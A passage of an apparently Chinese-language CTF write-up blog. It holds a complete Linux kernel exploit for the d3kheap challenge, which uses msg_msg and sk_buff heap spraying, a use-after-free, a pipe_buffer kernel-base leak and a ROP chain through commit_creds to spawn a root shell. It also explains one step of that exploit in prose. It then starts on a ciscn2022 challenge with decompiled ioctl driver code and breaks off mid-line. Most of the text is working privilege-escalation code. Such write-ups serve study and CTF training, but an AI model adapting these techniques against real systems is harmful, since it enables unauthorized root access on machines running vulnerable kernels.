class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line">del();</span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> retval;</span><br><span class="line">        retval=peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( retval&lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始有点困惑,为什么每个消息队列上还要安排一个96大小msg,之后却又没用上</p><p>其实这个是有大用的,在我们成功泄露完victime的下一个obj的prev后</p><p>我们需要通过修改msg_msg-&gt;next为这个prev来读取victime的下一个obj的地址</p><p>但是如果直接修改为prev就会出现一个问题,其next指针不为null,会继续向下解引用</p><p>虽然不至于发生kernel panic却会使得程序进入无限循环</p><p>因此此时改为prev-8就可以解决这个问题,由于96这个msg的存在,prev-8的位置很大概率就是0</p><p>但如果我们没有这个96msg的话,prev就会使msg_queue,这个我们是无法保证prev-8是0的</p><h2 id="ciscn2022华东南-catus"><a href="#ciscn2022华东南-catus" class="headerlink" title="ciscn2022华东南-catus"></a>ciscn2022华东南-catus</h2><p>保护还是那些常规保护</p><p>利用的点在于ioctl提供的功能(add,edit,delete)都没有加锁,再加上本题的内核版本是5.10,还能使用userfaultfd</p><p>所以用户自己可以构造一个uaf</p><p>本题依然是以msgmsg结构体为利用核心</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kernel_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r13</span></span><br><span class="line">  __int64 v11; <span class="comment">// r12</span></span><br><span class="line">  __int64 v12; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp-40h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">48</span> )                               <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v13, v2, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( delFlags &lt;= <span class="number">1</span> &amp;&amp; v13 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( addrList[v13] )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree();</span><br><span class="line">          ++delFlags;</span><br><span class="line">          addrList[v4] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">80</span> )                               <span class="comment">// edit</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v13, v2, <span class="number">24LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( editFlags &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v14;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v14 &gt; <span class="number">0x400</span> )</span><br><span class="line">          v9 = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x20</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = addrList[v13];</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = v9;</span><br><span class="line">            v12 = v15;</span><br><span class="line">            _check_object_size(v10, v9, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(v10, v12, v11) )</span><br><span class="line">            &#123;</span><br><span class="line">              ++editFlags;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != 